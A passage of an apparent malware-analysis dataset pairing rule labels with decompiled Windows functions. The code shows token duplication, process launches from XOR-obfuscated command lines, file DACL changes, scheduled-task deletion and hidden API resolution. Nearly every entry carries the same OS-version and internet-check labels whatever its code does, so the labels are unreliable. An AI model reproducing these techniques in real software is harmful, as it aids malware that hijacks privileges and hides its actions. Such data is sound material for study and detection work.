var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.0040610f();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x62584700;\n                    var_34h = 0x3134770c;\n                    var_30h = 0x47166216;\n                    var_2ch = 0x773e6201;\n                    var_28h = 0x62073123;\n                    var_24h = 0x62504711;\n                    var_20h = 0x312b7717;\n                    var_1ch = 0x47776216;\n                    var_10h = 0x62314777;\n                    var_ch._0_1_ = 0x62;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                        if (iVar3 != 0x4077be) {\n                            var_44h = 5;\n                            *(iVar5 + iVar4) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, 0x4117b0, *0x41dd68);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.0040610f();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1711
    },
    "00408e4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e4d(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41dd78 == 0) {\n        puStack572 = 0x408e94;\n        *0x41db20 = fcn.00408b2b();\n    }\n    else {\n        puStack572 = 0x408e89;\n        *0x41db20 = fcn.00408ba8();\n    }\n    if (*0x41db20 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x408ea8;\n        fcn.0040786d();\n        iStack552 = *0x41db20;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41db24;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41db20, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41db20, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408e4d, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41db20);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 728
    },
    "00408f53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408f53(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_98h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x6d344875;\n    iVar5 = 0x44;\n    var_48h = 0x673b5000;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x48357919;\n    var_40h = 0x502b6d0a;\n    puVar6 = &var_98h;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_98h = 0x44;\n    var_3ch = 0x79026727;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x6d424824;\n    var_34h = 0x673b5025;\n    var_30h = 0x48237914;\n    var_2ch = 0x501c6d13;\n    var_28h = 0x795e6725;\n    var_24h = 0x6d3b4862;\n    var_20h = 0x673e500a;\n    var_1ch = 0x4838790e;\n    var_18h = 0x500a6d08;\n    var_14h = 0x7943673c;\n    var_10h = 0x6d1f4835;\n    var_ch = 0x6748501c;\n    var_8h = 0x6d674850;\n    var_4h._0_1_ = 0x79;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar2 != 0x55870f) {\n            var_50h = 5;\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_98h, var_54h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1034
    },
    "00409753": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409753(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.00403024;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41dd74 & 1) != 0)) {\n        var_20h = 0x41d620;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.00401518(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00401270(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.004016ff(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41dd74 & 1) != 0)) {\n                iVar3 = fcn.00409414();\n            }\n            else {\n                iVar3 = fcn.004090bc();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.0040991b(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.004013d8();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1160
    },
    "0040a63a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040a63a(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "0040ae60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ae60(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int32_t pszFirst;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x68154820;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x48667525;\n    var_28h = 0x75496855;\n    pszFirst = 0x68794844;\n    var_8h._0_2_ = 0x7549;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xeac243) {\n            var_24h = 6;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 6) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411350, 0, 1, 0x411360, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x411370, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41dd68);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_4h),  -1 < iVar7 && (var_4h != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, piVar5);\n                                    piVar3 = var_4h;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_4h == 0x22 && (var_4h[2] == 0x3a)) && (var_4h[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar7 - var_4h >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_4h);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1451
    },
    "0040b335": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b335(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040b377;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x0040b377:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.00402ff1();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 639
    },
    "0040b8cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040b8cc(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41dda4 == NULL) {\n        var_2ch = 0x22163b7b;\n        var_28h._0_2_ = 0x7340;\n        var_8h = 6;\n        var_28h._2_1_ = 6;\n        stack0xffffffd7 = 0x54223318;\n        var_21h._0_1_ = 0x20;\n        var_21h._1_1_ = 0x41;\n        var_21h._2_2_ = 0x413b;\n        var_1ch = 0x4d414832;\n        var_18h._0_2_ = 0x4537;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar5 != 0x4eabf4) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x14202a1b;\n        var_28h._0_2_ = 0x3d36;\n        var_28h._2_1_ = 0x43;\n        stack0xffffffd7 = 0x3f1e7c7d;\n        var_21h._0_1_ = 0x3d;\n        var_21h._1_1_ = 0x70;\n        var_1ch = 0x7a524f70;\n        var_18h._0_2_ = 0x5153;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            iVar5 = var_10h;\n            if (iVar6 != 0x3e5189) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41dda4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41dda4 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41dda4)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1081
    },
    "0040c89d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c89d(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.0040b8cc();\n    fcn.0040c000(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040c000(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040c9a4:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto 